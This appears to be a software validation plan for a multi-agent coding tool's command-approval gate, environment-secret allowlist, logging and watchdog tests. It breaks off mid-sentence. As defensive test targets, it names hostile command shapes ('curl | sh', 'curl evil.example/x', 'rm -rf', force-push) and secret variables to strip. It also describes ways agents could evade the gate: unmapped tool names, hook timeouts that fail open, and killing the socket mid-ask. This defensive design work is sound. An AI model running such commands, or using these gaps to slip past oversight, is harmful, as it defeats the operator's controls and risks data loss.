---
phase: 4
slug: overnight-on-a-repo-that-matters
status: draft
nyquist_compliant: false
wave_0_complete: false
created: 2026-08-25
revised: 2026-08-25
---

# Phase 4 — Validation Strategy

> Per-phase validation contract for feedback sampling during execution.
> Derived from `04-RESEARCH.md` § Validation Architecture. Every command below was run,
> or its target file read, in the research session at `ad3d2f7`.
>
> **Revised after red-team round 1.** Three things changed and each closes a named defect:
> the per-task map now carries **one row per task, all 59 of them** (H-14 — ~35 tasks had no row,
> and 04-01, 04-14 and 04-18 had none at all); **no test file in this phase is POSIX-gated**
> (BL-10 — the two GATE integration files were criterion 2's only admissible evidence and would
> have passed vacuously on the only machine that runs them); and the Manual-Only table gains the
> two live observations the phase's claims turned out to rest on (BL-11, H-4).

---

## Test Infrastructure

| Property | Value |
|----------|-------|
| **Framework** | `node:test` (Node builtin runner) + `node:assert/strict` |
| **Config file** | none — the runner is invoked directly |
| **Loader** | `test/load-ts.cjs` — TypeScript transpile, electron stub (`:46-64`), `@shared/` alias resolution (`:66-68`) |
| **Quick run command** | `node --test test/<one>.test.cjs` |
| **Full suite command** | `npm test` (→ `node --test test/*.test.cjs`) |
| **Estimated runtime** | quick ~0.5–4 s · full ~24 s |
| **Measured baseline @ `ad3d2f7`** | **805 tests / 798 pass / 0 fail / 7 skipped (23.7 s)** |
| **Typecheck** | `npm run typecheck` (both projects) — 0 errors |
| **Lint** | `npm run lint` → `eslint . --max-warnings 0` |
| **CI gates** | `ci.yml:62` matrix `[ubuntu, windows, macos]`, no `continue-on-error` on the test job |

**Skipped-count invariant, and it is now a HARD ZERO for this phase.** The baseline is **7** skipped
(all win32, from `{ skip: !POSIX }`). **No plan in Phase 4 adds a skip.** That is not an aspiration: the
planner measured a full child-process → `\\.\pipe\` → `HookServer` round trip on this machine during the
revision session, so `test/gate-harness.cjs` and both of its consumers run here. Any plan that finds
itself reaching for `{ skip: !POSIX }` must stop and report, because:

- `test/gate03-roundtrip.test.cjs` and `test/gate05-bounded-wait.test.cjs` are criterion 2's **only**
  admissible evidence (see § Anti-Vacuous-Pass Rules). A skipped case is a vacuous pass.
- A skipped case has **no RED**, so the RED-first discipline every one of those plans carries would be
  unproducible.
- `test/suite-integrity.test.cjs` freezes the skip census three ways — `DECLARED_SKIPS` (`:195-203`),
  a per-file `deepEqual` (`:235`), and `FROZEN = { win32: 6, other: 1 }` (`:256`) — and its own failure
  message additionally demands that `.planning/phases/01-finish-the-floor/01-VALIDATION.md`'s published
  ceiling move in the same change. **No Phase 4 artifact knew that file existed before the revision.**
  Plans 04-06 and 04-16 now own it and `01-VALIDATION.md` in their waves, as an escape hatch with a named
  re-derivation step — not as an intention.

**`node --test test/suite-integrity.test.cjs` is a per-task check for every plan that adds or edits a test
file.** It is 4 cases and under a second, and it is the tripwire that catches a skip nobody meant to add.

---

## Sampling Rate

- **After every task commit:** `node --test test/<the file that task owns>.test.cjs` (0.5–4 s), plus
  `node --test test/suite-integrity.test.cjs` when a test file changed, plus
  `node --test test/repo-claims.test.cjs` when a **pinned** source file changed (see the pin map below).
- **After every plan wave:** `npm test` **and** `npm run typecheck` **and** `npm run lint`.
  Full suite, not a subset — this phase edits `hooks.ts`, `delivery.ts`, `pty.ts` and `boot.ts`, the four
  widest-blast-radius files in the repo.
- **Before `/gsd:verify-work`:** full suite green locally, plus the operator-owned checks below.
- **Max feedback latency:** 24 s (full suite).

### The pin map — which files redden `test/repo-claims.test.cjs`

Five plans edit files that `test/repo-claims.test.cjs` pins, and only four of them own it. Run it per
task, not at the wave gate.

| Pinned surface | Clause | Plans that touch it | Owns `repo-claims`? |
|---|---|---|---|
| `src/main/floor/**` module-scope sweep | `:1196` | 04-11 (new `floor/watchdog.ts`) | no — satisfy by construction |
| `CommandCenterPanel.tsx:796` `⚠` verbatim | `:717` + clauses 2/3 (`:782`, `:815-838`) | 04-14 (must NOT touch), 04-18 (changes it) | 04-18 **yes**, 04-14 no |
| sub-14px `fontSize` clauses | `:782`, `:815`, `:865`, `:900` | 04-12, 04-14, 04-18 | 04-18 only |
| `MARKER_LEDGER` (4-way pin) | `:1291-1298`, `:1307`, `:1422`, `:1453` | 04-10 (w3), 04-13 (w4), 04-16 (w5), 04-19 (w7) | all four, one per wave |
| the sole `new HookServer(` in `boot.ts` | `test/hive-durability.test.cjs:186-193` | 04-20 | n/a — adds arguments, not a call |

---

## Per-Task Verification Map

> **Every task in every Phase 4 plan maps to exactly one row here.** 20 plans, 7 waves, **59 tasks**,
> 59 rows. The first draft carried 29 behaviour rows for 57 tasks and left 04-01, 04-14 and 04-18 with
> none at all — including 04-06-T2, which wires GATE-03's entire call site. Every `Automated Command`
> below is runnable without a watch flag.

| Task ID | Plan | Wave | Requirement | Threat Ref | Secure Behavior | Test Type | Automated Command | Status |
|---------|------|------|-------------|------------|-----------------|-----------|-------------------|--------|
| 04-01-T1 | 04-01 | 1 | GATE-04 | T-04-SBX-02 | The `--add-dir` verdict is measured with a negative control, and its `codex exec`-only scope is stated in the file | spike | `grep -c '^VERDICT: ' .planning/phases/04-overnight-on-a-repo-that-matters/04-SPIKE-codex-sandbox.md` | pending |
| 04-01-T2 | 04-01 | 1 | GATE-03, GATE-05 | T-04-CMD-16 | A real shim child reaches a real `HookServer` **on win32**, selectable by shim constant, adding zero cases and zero skips | harness | `node test/gate-harness.cjs && node --test test/suite-integrity.test.cjs && npm test` | pending |
| 04-02-T1 | 04-02 | 1 | RECORD-01, RECORD-02 | T-04-LOG | One migration at `MIGRATIONS[2]`; `user_version` is 3 after reopen | unit | `node --test test/record-persist.test.cjs` | pending |
| 04-02-T2 | 04-02 | 1 | RECORD-01, RECORD-02 | T-04-LOG | The five `PersistStore` methods, with cached prepared statements | unit | `node --test test/record-persist.test.cjs test/record-retention.test.cjs` | pending |
| 04-02-T3 | 04-02 | 1 | RECORD-01, RECORD-02 | T-04-LOG | Row survives close/reopen **with `target` non-null**; a >16 MiB day reads back from its FIRST row; retention deletes only past the bound | unit | `node --test test/record-persist.test.cjs test/record-retention.test.cjs` | pending |
| 04-03-T1 | 04-03 | 1 | VIGIL-03 | T-04-BLK-02 | The blocked-agent test is **RED** against `delivery.ts:740`, naming `setStatus` and `WAKE_NUDGE`, with a control case | unit, **MUST be RED first** | `node --test test/delivery-main.test.cjs \|\| echo "EXPECTED RED"` | pending |
| 04-03-T2 | 04-03 | 1 | VIGIL-03 | T-04-BLK-01 | A blocked agent is not idled by quiesce and not mailed by the nudge; `blocked` is a **required** `DeliveryDeps` member | unit | `node --test test/delivery-main.test.cjs` | pending |
| 04-03-T3 | 04-03 | 1 | VIGIL-03 | T-04-BLK-02, T-04-BLK-05, T-04-BLK-06 | `matchBlockHint` strips, caps at 120 and bounds its window; `boot.ts:1056-1117` supplies a **real** producer reading `outputTail` | integration | `npm run typecheck && npm test && npm run lint` | pending |
| 04-04-T1 | 04-04 | 1 | VIGIL-04, VIGIL-02 | T-04-AGE-03 | `updatedAt?` and `released?` declared; a legacy `createdAt`-only card round-trips unchanged | unit | `npm run typecheck` | pending |
| 04-04-T2 | 04-04 | 1 | VIGIL-04 | T-04-AGE-09, T-04-AGE-10 | The stamp is in `writeTasks` (`hive.ts:2112-2126`), diff-driven, so the five direct callers are covered and an unchanged card keeps its value | unit | `node --test test/hive-task-mutation.test.cjs` | pending |
| 04-04-T3 | 04-04 | 1 | VIGIL-04 | T-04-AGE-01 | `add`/`patch`/`claim`/`done` **each** stamp ISO `updatedAt` ≥ `createdAt`; `writeTasks` driven directly with an unchanged-sibling assertion | unit | `node --test test/hive-task-mutation.test.cjs && npm test` | pending |
| 04-05-T1 | 04-05 | 1 | GATE-02 | T-04-ENV-01, T-04-ENV-02 | Allowlist keeps `PATH`/`HOME` and drops `AWS_SECRET_ACCESS_KEY`/`GH_TOKEN`/`ANTHROPIC_API_KEY`; mixed-case `Path` survives (L-13); seven-item ceiling | unit | `node --test test/pty-env-allowlist.test.cjs` | pending |
| 04-05-T2 | 04-05 | 1 | GATE-02 | T-04-ENV-07, T-04-ENV-08 | The spawn env carries `HOME`/`USERPROFILE`, `TMP` and a planted `HIVE_CANARY_KEEP` **through the filter**, and no planted `CANARY_DROP` | integration (stubbed `nodePty.spawn`) | `node --test test/pty-spawn-env.test.cjs test/pty-env-allowlist.test.cjs && npm test` | pending |
| 04-05-T3 | 04-05 | 1 | GATE-02 | T-04-ENV-03 | **Manual-Only.** One live non-Claude agent authenticates and completes a card; `env` shows the canaries both ways | checkpoint | `npm test && npm run typecheck && npm run lint` + operator | pending |
| 04-06-T1 | 04-06 | 2 | GATE-03, T-04-NET | T-04-CMD-01, T-04-NET-01, T-04-CMD-18 | Four shapes judged on tokens with the right verdict `kind`; benign forms null; **scheme-less hosts judged**; empty allowlist asks, naming the key | unit | `node --test test/command-shape.test.cjs` | pending |
| **04-06-T2** | 04-06 | 2 | GATE-03 | T-04-CMD-17, T-04-CMD-20, T-04-SNAP-08 | **GATE-03's entire call site**: the arm keys on a command string not `tool_name === 'Bash'`; it runs before `protectedPathDenial` (call-to-call); `restore` is `rootTailVerdict`'s fifth literal; ceiling (j)-(r) | unit + repo-fact | `npm run typecheck && npm test` | pending |
| 04-06-T3 | 04-06 | 2 | GATE-03 | T-04-CMD-01 | A deny reaches a real engine over the real socket, including `curl \| sh` which the path gate alone would allow — **on win32, zero skipped** | integration | `node --test test/gate03-roundtrip.test.cjs && node --test test/suite-integrity.test.cjs && npm test` | pending |
| 04-07-T1 | 04-07 | 2 | VIGIL-03 | T-04-BLK-11, T-04-BLK-12 | `BLOCK_HINTS` exists once; the renderer's local declaration is **deleted**; the six engines it was never observed on are named beside it | unit | `npm run typecheck && node --test test/repo-claims.test.cjs` | pending |
| 04-07-T2 | 04-07 | 2 | VIGIL-03 | T-04-BLK-08 | Detection works with **no renderer module loaded** (`require.cache` scan); positive control; A8 bound; recovery via the window | unit | `node --test test/block-detect.test.cjs && node --test test/suite-integrity.test.cjs && npm test` | pending |
| 04-08-T1 | 04-08 | 2 | VIGIL-02 | T-04-CARD-01, T-04-CARD-02 | Card released in the teardown tick, naming the dropping agent, **synchronously**, through `deps.hive` | unit | `npm run typecheck` | pending |
| 04-08-T2 | 04-08 | 2 | VIGIL-02 | T-04-CARD-03, T-04-CARD-07 | Follow-up patch carries `worktreeHasUnintegratedWork`'s branch/detail; `finalizeAgentWorktree` widened to take `deps`, its one caller in the same file | unit | `node --test test/agent-lifecycle.test.cjs` | pending |
| 04-08-T3 | 04-08 | 2 | VIGIL-02 | T-04-CARD-03, T-04-CARD-05 | A git failure loses the branch and never the release; `released.branch === undefined` strictly; no-card writes nothing | unit | `node --test test/agent-lifecycle.test.cjs && npm test` | pending |
| 04-09-T1 | 04-09 | 2 | RECORD-05 | T-04-SNAP-01..04, T-04-SNAP-09 | Restore 1 of 3; other 2 byte-identical; operator `status --porcelain` + `rev-parse HEAD` + branches unchanged; gitignored dir 0 entries; nested repo survives; `realpathSync.native` keying | integration | `node --test test/restore-points.test.cjs` | pending |
| 04-09-T2 | 04-09 | 2 | RECORD-05 | T-04-SNAP-07 | Store excluded twice (ignore seed + `UNTRACK_PATHS`); the timer is in `SHUTDOWN_STEPS` **and pinned by name** | unit | `node --test test/boot-floor.test.cjs && npm run typecheck` | pending |
| 04-09-T3 | 04-09 | 2 | RECORD-02 | T-04-LOG-07, T-04-LOG-08 | A day past 16 MiB reads back **whole, from its first row**, driven through the real `appendLog`; a failing store costs the mirror, never the JSONL | unit | `node --test test/record-retention.test.cjs && npm test` | pending |
| 04-10-T1 | 04-10 | 3 | GATE-03 | T-04-CMD-07, T-04-CMD-24 | pi's `HIVE_AUTO_APPROVE` branch is gated on main's verdict; **OpenCode sends `tool_input`** so there is something to judge; both marked, worded to distinguish a fixed defect from an unverifiable | unit | `npm run typecheck && npm test` | pending |
| 04-10-T2 | 04-10 | 3 | GATE-03 | T-04-CMD-08, T-04-CMD-17 | Grok's **real** translator (run as a child process) maps a main-side deny to `{decision:'deny'}` with the reason; a **codex-shaped** payload is denied; allow control; derived seven-engine reach | unit | `node --test test/engine-parity.test.cjs` | pending |
| 04-10-T3 | 04-10 | 3 | GATE-03 | T-04-CMD-09, T-04-CMD-23 | `MARKER_LEDGER` matches a live grep across all four pins; the honest claim is pinned **in both directions**, with a recorded mutation check | repo-fact | `node --test test/repo-claims.test.cjs && npm test` | pending |
| 04-11-T1 | 04-11 | 3 | VIGIL-01 | T-04-ABS-01, T-04-ABS-03, T-04-ABS-07 | Silence past threshold alarms **once** (1, then 0 across 5 ticks, then 1); fires when the **god** is the dead one, addressed to the operator, never `to:'god'`; payload names transition-time `doing` cards | unit | `node --test test/absence-watchdog.test.cjs` | pending |
| 04-11-T2 | 04-11 | 3 | VIGIL-01 | T-04-ABS-02, T-04-ABS-05 | The timer is torn down by `floor.shutdown()` and pinned by name; the push title is self-sufficient; `floor/watchdog.ts` passes the `:1196` module-scope sweep | unit + repo-fact | `node --test test/boot-floor.test.cjs test/repo-claims.test.cjs && npm run typecheck` | pending |
| 04-11-T3 | 04-11 | 3 | VIGIL-01 | — | Whole-suite blast radius, with `index.ts`/`config.ts`/`sw.js` untouched | full-suite | `npm test && npm run typecheck && npm run lint` | pending |
| 04-12-T1 | 04-12 | 3 | VIGIL-04 | T-04-AGE-06 | `relAge` matches `WorkersTab.tsx:20` at all five boundaries; negative and NaN degrade to `0s`; the four existing copies untouched | unit | `node --test test/renderer-components.test.cjs && npm run typecheck` | pending |
| 04-12-T2 | 04-12 | 3 | VIGIL-04, VIGIL-02 | T-04-AGE-07, T-04-CARD-06, T-04-AGE-08 | Age renders on cards with **four channels** at 9 h and none at 4 min; `done` takes no emphasis; `DROPPED BY` in the vacated slot; **no branch placeholder**; geometry unchanged | unit + repo-fact | `node --test test/renderer-components.test.cjs test/repo-claims.test.cjs` | pending |
| 04-12-T3 | 04-12 | 3 | VIGIL-04 | T-04-AGE-05 | Age renders on unanswered asks (4 min); the four-channel distinction asserted as ONE test for both surfaces | unit | `node --test test/renderer-components.test.cjs && npm test` | pending |
| 04-13-T1 | 04-13 | 4 | GATE-04 | T-04-SBX-03 | The codex preset yields `-s workspace-write --add-dir <agentDir>` on, and the bypass flag byte-identical off | unit | `npm run typecheck` | pending |
| 04-13-T2 | 04-13 | 4 | GATE-04 | T-04-SBX-04 | `commandForAutoMode` and `buildSpawnCommand` return the SAME string — **one test calling both**, in a file whose loader can reach both projects; opt-in **off** byte-identical to a captured baseline | unit | `node --test test/spawn-command-parity.test.cjs && node --test test/suite-integrity.test.cjs && npm run typecheck` | pending |
| 04-13-T3 | 04-13 | 4 | GATE-04 | T-04-SBX-05 | Exactly one engine row; the "other N" count derived from the preset table; the marker added iff the spike said so, with the ledger reconciled | unit + repo-fact | `node --test test/repo-claims.test.cjs && npm test` | pending |
| 04-13-T4 | 04-13 | 4 | GATE-04, **GATE-03**, **VIGIL-03** | T-04-SBX-06, T-04-SBX-10, T-04-CMD-25, T-04-BLK-13 | **Manual-Only.** A live **interactive** codex agent: the real spawned argv, a completed card, mail, `memory.md`, zero write-refusals with a positive control, the opt-in-off fallback — **plus a live GATE-03 refusal and a live VIGIL-03 block observation** | checkpoint | `node --test test/agent-provider.test.cjs test/repo-claims.test.cjs && npm test` + operator | pending |
| 04-14-T1 | 04-14 | 4 | GATE-03 | T-04-CMD-14 | The `destructive` variant reads 7.12:1 in dark mode (was 1.85:1) and is byte-identical in light; own atomic commit; pinned by a test | unit | `node --test test/renderer-components.test.cjs && npm run typecheck` | pending |
| 04-14-T2 | 04-14 | 4 | GATE-03 | T-04-CMD-13 | `BlockReason.command` is populated; the summary names the agent; main's reason renders verbatim; the invented fallback is deleted | unit | `node --test test/renderer-components.test.cjs` | pending |
| 04-14-T3 | 04-14 | 4 | VIGIL-03 | T-04-BLK-09, T-04-BLK-14 | `blocked` beats `armed` on the roster badge — four cases; `:796` **unchanged** and `repo-claims` diff empty (the aria rider is 04-18's) | unit + repo-fact | `node --test test/renderer-components.test.cjs test/repo-claims.test.cjs && npm test` | pending |
| 04-15-T1 | 04-15 | 4 | GATE-05 | T-04-ASK-01, T-04-ASK-04 | Unguessable single-use ids satisfying `PHONE_TASK_ID_RE`; expiry unanswerable; `sweep` settles once; **`ASK_TTL_MS ≤ PRETOOLUSE_HOOK_TIMEOUT_SEC × 1000`, both read from source** | unit | `node --test test/control.test.cjs` | pending |
| 04-15-T2 | 04-15 | 4 | GATE-05 | T-04-ASK-03, T-04-ASK-28, T-04-ASK-29 | The ask reply is simultaneously a valid deny and a `hive_ask`; `deadlineMs === expiresAt`; **a cross-agent poll is denied with a positive control**; the engine PreToolUse timeout is raised so the shim is not killed before it answers; `control.ts` untouched | unit | `node --test test/control.test.cjs && npm test` | pending |
| 04-15-T3 | 04-15 | 4 | RECORD-01, GATE-05 | T-04-LOG-09, T-04-ASK-30, T-04-ASK-31 | The writer fires from a real `PreToolUse` through the real `HookServer` with `target` non-null and a **token-derived** `agent_id`; an expired ask's row reads `deny` after a sweep; **a real `git push origin +main` produces a `hive_ask` and `rm -rf` does not** | integration | `node --test test/record-persist.test.cjs test/control.test.cjs && node --test test/suite-integrity.test.cjs && npm test` | pending |
| 04-16-T1 | 04-16 | 5 | GATE-05 | T-04-ASK-09, T-04-ASK-11, T-04-ASK-32 | A fresh short connection per poll (never a held one); the 5 s non-ask budget unchanged; the first-connection fail-open verbatim; **a poll-scoped error handler that denies**; two `LIVE-UNVERIFIED` markers | unit | `npm run typecheck && npm test` | pending |
| 04-16-T2 | 04-16 | 5 | GATE-05 | T-04-ASK-10, T-04-ASK-12, T-04-ASK-32, T-04-ASK-33 | Unanswered denies · explicit yes allows · **pre-ask** dead socket allows (empty stdout) · **mid-ask** dead socket denies (non-empty) · cross-agent poll rejected — all on the real shim's real stdout, **on win32, zero skipped** | integration | `node --test test/gate05-bounded-wait.test.cjs && node --test test/suite-integrity.test.cjs && npm test` | pending |
| 04-16-T3 | 04-16 | 5 | GATE-05 | T-04-CMD-22 | All four ledger pins reconciled from a live grep in the same commit as the two markers | repo-fact | `node --test test/repo-claims.test.cjs && npm test` | pending |
| 04-17-T1 | 04-17 | 5 | GATE-05, VIGIL-01 | T-04-ASK-15, T-04-ASK-17, T-04-ASK-34, T-04-ABS-08 | A tool ask appears on `GET /phone/api/asks` with `kind:'tool'`, a regex-valid id and a **computed** `expiresInMs`; `POST /phone/api/answer` resolves it; **a malformed `answer` is a 400 and leaves the ask pending**; `floorQuiet` is a sibling and `asks.length` is unchanged; the auth block has **no diff** | unit | `node --test test/webhook-endpoints.test.cjs` | pending |
| 04-17-T2 | 04-17 | 5 | GATE-05, VIGIL-01 | T-04-ASK-16, T-04-ASK-35, T-04-ASK-36, T-04-ASK-37 | The countdown is a re-derived duration with **positive** greps on `receivedAt`/`expiresInMs`/the four literals; the command is **escaped**; the quiet strip is non-interactive; CSP hashes regenerated in the same commit | unit | `node --test test/build-assets.test.cjs && npm test` | pending |
| 04-17-T3 | 04-17 | 5 | GATE-05, VIGIL-01 | T-04-ASK-18, T-04-ASK-19 | `sw.js` changes by exactly one line; the push body carries no command, path or `?`, with a positive control; the title is not generic | unit | `node --test test/webhook-endpoints.test.cjs && npm test` | pending |
| **04-20-T1** | 04-20 | 5 | GATE-03, GATE-05, RECORD-01 | T-04-CMD-26, T-04-LOG-11, T-04-CMD-27 | The four seams are supplied at the **sole production** `new HookServer(...)`; `recordToolCall` is a closure (boot ordering); the toast half honours `readConfig().notifications`; the four declaring files are untouched | unit | `npm run typecheck && node --test test/hive-durability.test.cjs` | pending |
| **04-20-T2** | 04-20 | 5 | GATE-03, GATE-05, RECORD-01 | T-04-CMD-26, T-04-NET-02, T-04-ASK-39 | On a really-booted floor: the host verdict **changes with the config**; a force-push yields `hive_ask` and `rm -rf` does not; a real row lands in `floor.persist` with a non-null target and a token-derived id; the notification gate holds both ways. Every case seen RED first | integration | `node --test test/boot-floor.test.cjs && node --test test/suite-integrity.test.cjs && npm test && npm run lint` | pending |
| 04-18-T1 | 04-18 | 6 | GATE-05 | T-04-ASK-21 | `(askId, approved)` reaches `answerApproval` through the **existing** `control:approvalRequest` channel; no new channel; `writePty` count unchanged | unit | `node --test test/renderer-components.test.cjs && npm run typecheck` | pending |
| **04-18-T2** | 04-18 | 6 | GATE-05, VIGIL-03 | T-04-ASK-22, T-04-ASK-23, T-04-ASK-38, T-04-BLK-10 | `formatRemaining`'s five bands unit-tested; the ink-ramp escalation and both command-rendering directions asserted in static markup; the post-resolution **shape** asserted from props; the `⚠` aria swap with `:717`'s verbatim pin moved in the same commit | unit + repo-fact | `node --test test/renderer-components.test.cjs test/repo-claims.test.cjs` | pending |
| 04-18-T3 | 04-18 | 6 | VIGIL-01 | T-04-ABS-09 | The `QUIET` chip copies the `PUBLIC` geometry; `TUNNEL_CHIP_W1`/`W2` **re-measured with both chips**, base vs head, at three widths, never by arithmetic | unit + probe | `node --test test/renderer-components.test.cjs && npm test` | pending |
| **04-18-T4** | 04-18 | 6 | GATE-05, VIGIL-01 | T-04-ASK-25, T-04-ASK-27, T-04-ASK-38 | **Manual-Only.** A real ask answered at three widths in both themes; the four countdown states live; a wrapped command; **A9 focus retention demonstrated by tabbing after a click**; an expiry auto-denying; the chip's three degradation steps | checkpoint | `node --test test/renderer-components.test.cjs && npm test` + operator | pending |
| 04-19-T1 | 04-19 | 7 | all eleven | T-04-DOC-01..03 | SECURITY.md names all four fail-opens with dispositions and owners and carries the honest claim verbatim; TELEMETRY.md states the ring is unchanged and `synchronous = NORMAL` | doc + full-suite | `npm test && npm run typecheck && npm run lint && npm run build` | pending |
| 04-19-T2 | 04-19 | 7 | all eleven | T-04-DOC-04..08 | The ledger matches a live grep; four both-directions closing clauses; **all 59 map rows filled**; REQUIREMENTS.md and ROADMAP.md updated; the three frontmatter flags flipped or explained | repo-fact | `node --test test/repo-claims.test.cjs && npm test` | pending |
| 04-19-T3 | 04-19 | 7 | all eleven | T-04-DOC-03 | **Manual-Only.** The physical-device attempt with its honest outcome; the kill-and-restart crash test; the eleven checkbox rulings | checkpoint | `npm test && npm run typecheck && npm run lint && npm run build` + operator | pending |

*Status: ⬜ pending · ✅ green · ❌ red · ⚠️ flaky*

---

## Anti-Vacuous-Pass Rules (D-33 / D-40, binding)

Every row above carries an **absence signature** in `04-RESEARCH.md` § Phase requirements → test map:
what a *vacuous* version of that test would look like. These are the ones that bite hardest — the last
six were added by red-team round 1, each after a plan was found to have written the vacuous version.

| Requirement | The test that could pass while the feature does nothing |
|---|---|
| GATE-02 | Asserting only that secrets are **absent** — passes against a filter returning `{}`, and against a PTY that never spawned. **Assert the positive lower bound too — and assert a variable that comes THROUGH the filter.** `AGENT_ID`, `HIVE_ROOT`, `HIVE_SOCK_TOKEN` and `PATH` all arrive AFTER the `...process.env` spread (`pty.ts:752`, `:772`, `:774`), so all four pass against `allowFromEnv = () => ({})`. Use `HOME`/`USERPROFILE`/`TMP` or a planted `HIVE_CANARY_KEEP`. |
| GATE-03 | Only deny cases — passes against a function that returns a verdict unconditionally. **Assert the benign forms return null**, and assert each verdict's `kind`. |
| GATE-03 | **Keying the arm on `tool_name === 'Bash'`.** That is Claude Code's tool name; six of the seven engines forward their own, unmapped, and there is no normalization in this repo. Every unit test stays green while the gate refuses nothing on codex, grok, pi, OpenCode, kimi and agy. **Drive a codex-shaped payload.** |
| GATE-03 | **Judging only `scheme://` tokens.** `curl evil.example/x` is the default spelling of the shape criterion 1 names and matches no scheme. **Assert the scheme-less form, both directions.** |
| GATE-03/05 | Calling `handle()` directly — proves the judge, not the loop. **Drive the real shim as a child process into the real `HookServer`** (`test/hook-auth-roundtrip.test.cjs:95` is the model). And **do not POSIX-gate it**: a skipped case is a vacuous pass on the only machine that runs it, and it has no RED. |
| GATE-04 | argv asserted but never spawned — the GATE-01-shaped failure this project names. **A live run is required, and it must be INTERACTIVE**: `hiveProvisioning.ts:207` records that hooks and prompts fire in interactive codex sessions, not in `codex exec`, so a clean spike cannot reproduce a prompt defect. |
| GATE-05 | **Every test starting from an already-opened ask.** The registry, the dual-reading reply, the poll loop, the phone and the banner can all ship green with **zero commands ever routed to ask**. Assert that a real `git push origin +main` through the real `HookServer` produces `hive_ask`, and that `rm -rf` does not. |
| GATE-05 | **Deriving the deadline separately from the TTL, or ignoring the engine's own hook timeout.** At 120 s against grok's ~5 s default the shim is killed, writes no stdout, and no stdout is ALLOW. Assert `ASK_TTL_MS ≤ PRETOOLUSE_HOOK_TIMEOUT_SEC × 1000` from source. |
| GATE-05 | **Testing only the pre-ask dead socket.** The mid-ask socket death is a different code path and the opposite verdict; without it, killing the floor is an agent-triggerable way to turn a pending deny into an allow. |
| RECORD-01 | Asserting row count — passes with a null `target`, which is the half the requirement exists for. And **a writer at `handle`'s entry can only record `pending`**: `decision` and `reason` are produced at ~30 return points. |
| RECORD-02 | Asserting a tail returns rows — that is exactly what the 8 MiB rotate already does. **Assert the FIRST row of the day.** |
| RECORD-05 | Asserting only the restored file — passes while the other two were clobbered. |
| VIGIL-01 | Asserting "an alarm fired" without the next tick — misses per-tick spam. |
| VIGIL-03 | **If `test/delivery-main.test.cjs`'s new blocked-agent test PASSES before the fix lands, the fixture is wrong** — it must fail against `delivery.ts:740` as it stands today. And a `blocked` value that only ever arrives from a test fixture is D-28 rebuilt: **grep the production composition root.** |
| VIGIL-04 | Testing one verb leaves the other three unstamped. And **stamping in `mutateTasks` leaves five direct `writeTasks` callers unstamped** — the webhook and all four voice paths. |
| every gate | **A seam declared as an optional constructor argument and never supplied.** Optional means nothing fails when it is missing. Assert the seam's **effect** on a really-booted floor (04-20-T2), never its presence in an argument list. |
| every grep gate | **`grep -c` counts lines, not occurrences.** `resources/phone/index.html` holds 21 `taskId` occurrences on 15 lines and `sw.js` holds 10 on 5. A `grep -c … ≥ 21` gate cannot pass on correct code. Use `grep -o … \| wc -l`. The repo documents this trap at `test/repo-claims.test.cjs:1325-1329`. |
| every absence gate | **An absence grep that measures 0 today passes against code that was never written.** Pair every negative with a positive lower bound over the same surface. |

---

## Wave 0 Requirements

**Planner deviation, stated rather than performed silently.** The original Wave 0 named nine new test
files that must exist "before or alongside the work they verify". A separate wave-0 plan creating all
nine with real assertions would leave `npm test` **red for the entire phase** -- and this project's bar
is *0 failures at every checkpoint, with no pre-existing-failure allowance*. So the files are
created **RED-first inside the plan that implements the behaviour they test** (the `File Origin` column
below names the owning task). That satisfies "alongside", keeps every wave boundary green, and
preserves the RED-drive discipline every Phase 1 and Phase 2 SUMMARY in this repo already follows.
**Each owning plan's acceptance criteria require the RED run to be recorded verbatim in its SUMMARY.**

Wave 0 proper (**plan 04-01**) therefore carries the two things that genuinely cannot wait:

- [ ] **The spike (04-01 task 1):** `codex exec -s workspace-write --add-dir <agentDir>` on this
      machine, with a **negative control** run without `--add-dir`. It decides whether GATE-04 (plan
      04-13) **builds** with the sandbox variant, and it states its own scope: `codex exec` is
      non-interactive (`hiveProvisioning.ts:207`), so the CLAIM is decided by plan 04-13 task 4's live
      interactive agent. Produces `04-SPIKE-codex-sandbox.md` with a single `VERDICT:` line.
- [ ] **`test/gate-harness.cjs` (04-01 task 2):** the real-shim-child into real-`HookServer` driver,
      extracted from `test/hook-auth-roundtrip.test.cjs:65-125` — **and made to work on win32**, which
      the original extraction would not have been. Its `opts.shim` selector lets plan 04-10 drive grok's
      real translator as a child process instead of re-implementing its decoder. Two known consumers
      (`test/gate03-roundtrip.test.cjs`, `test/gate05-bounded-wait.test.cjs`) and no in-repo precedent
      for a re-connecting shim (`04-PATTERNS.md` No Analog Found). **Deliberately not named
      `*.test.cjs`**, so it adds zero cases to `npm test`.

### Why the harness is not POSIX-gated, measured rather than argued

`test/hook-auth-roundtrip.test.cjs` is POSIX-only, and its own comment at `:39-41` says why: *"The shim
connects to a UNIX domain socket path. On Windows the app uses a `\\.\pipe\` name instead, **which this
fixture does not model**."* The limitation is the hand-built `path.join(home, 'hive', 'hooks.sock')` at
`:89` — a fixture choice, not a platform bound. Meanwhile `test/boot-floor.test.cjs:178-190` runs on
win32 with no skip and successfully `net.createConnection(floor.hive.sockPath())` against a named pipe.

The planner measured the full child→pipe→server round trip on this machine during the revision session:

```
platform= win32
sock= \\.\pipe\hello-markx-8acef5346d14
child exit 0 stdout: {"saw":{"hook_event_name":"PreToolUse","tool_name":"Bash"}}
```

So the harness asks `hive.sockPath()` instead of hand-building, and **every one of the ten new test files
runs on all three platforms.** The 7-skip baseline is unchanged and `test/suite-integrity.test.cjs`'s
`FROZEN = { win32: 6, other: 1 }` never moves.

### The ten RED-first files and their owners

| File | Owning plan / task | Wave | POSIX-only |
|---|---|---|---|
| `test/pty-env-allowlist.test.cjs` | 04-05 / T1 | 1 | no |
| `test/pty-spawn-env.test.cjs` | 04-05 / T2 | 1 | no |
| `test/record-persist.test.cjs` | 04-02 / T3 | 1 | no |
| `test/record-retention.test.cjs` | 04-02 / T3 | 1 | no |
| `test/command-shape.test.cjs` | 04-06 / T1 | 2 | no |
| `test/gate03-roundtrip.test.cjs` | 04-06 / T3 | 2 | **no — see above** |
| `test/block-detect.test.cjs` | 04-07 / T2 | 2 | no |
| `test/restore-points.test.cjs` | 04-09 / T1 | 2 | no |
| `test/spawn-command-parity.test.cjs` | 04-13 / T2 | 4 | no |
| `test/absence-watchdog.test.cjs` | 04-11 / T1 | 3 | no |
| `test/gate05-bounded-wait.test.cjs` | 04-16 / T2 | 5 | **no — see above** |

`test/pty-spawn-env.test.cjs` and `test/spawn-command-parity.test.cjs` are new since the revision.
The first replaces a plan to extend `test/pty-sanitize.test.cjs`, which tests `sanitizePtyText` from
`useHive.ts` in 63 lines and spawns nothing. The second exists because
